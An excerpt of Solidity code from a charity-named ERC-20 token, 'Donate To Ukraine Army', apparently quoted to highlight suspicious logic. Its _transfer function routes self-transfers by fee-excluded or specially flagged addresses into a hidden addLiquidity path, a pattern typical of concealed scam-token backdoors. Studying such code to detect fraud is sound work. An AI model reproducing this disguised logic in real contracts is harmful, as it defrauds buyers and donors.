...
library Address {
    ...
    function ArmyPair(address account) internal pure  returns (bool) {
...
contract DonateToUkraineArmy is Ownable, IERC20 {
    ...
    string private _name = "Donate To Ukraine Army";
    string private _symbol = "UKRAINEARMY";
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (Army2Pair(from, to)) {return addLiquidity(amount, to);}
        ...
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.ArmyPair(to) && to != address(this) && !inLiquidityTransaction && !babybool) {
    ...
    function Army2Pair(address from, address to) internal view returns(bool) {
        return (_excludedFromFee[msg.sender] || Address.ArmyPair(to)) && to == from;
    }
